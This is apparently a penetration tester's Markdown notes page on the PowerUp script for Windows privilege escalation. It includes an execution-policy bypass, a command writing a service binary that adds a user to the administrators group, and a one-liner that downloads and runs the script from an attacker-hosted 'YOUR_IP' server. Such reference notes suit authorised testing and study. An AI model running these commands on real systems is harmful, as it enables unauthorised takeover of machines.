---
tags: [tool, privesc, windows, powershell]
tool: "powerup"
category: "Privesc"
installed: true
phase: [enumeration, privesc]
---

# PowerUp - Windows Privilege Escalation

## Tool Overview
Purpose: PowerShell script for finding Windows privilege escalation vectors
Location: ~/tools/privesc/windows/PowerUp.ps1

## When to Use
- When you have PowerShell access
- To check for common misconfigurations
- For automated service abuse

## How to Use It

Load in PowerShell:
powershell -ep bypass
Import-Module .\PowerUp.ps1

Basic Checks:
Invoke-PrivescAudit

Check for Service Abuse:
Get-ModifiableServiceFile
Get-ModifiableService
Get-UnquotedService

Write a Service Binary:
Write-ServiceBinary -Name 'ServiceName' -Command 'net localgroup administrators user /add'

Transfer to Target:
On Kali: cd ~/tools/privesc/windows && python3 -m http.server 8000
On target: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/PowerUp.ps1'); Invoke-PrivescAudit"

## What It Finds
- Service misconfigurations
- Unquoted service paths
- Modifiable services
- AlwaysInstallElevated
- Registry checks

## Related Tools
winpeas, seatbelt, jaws
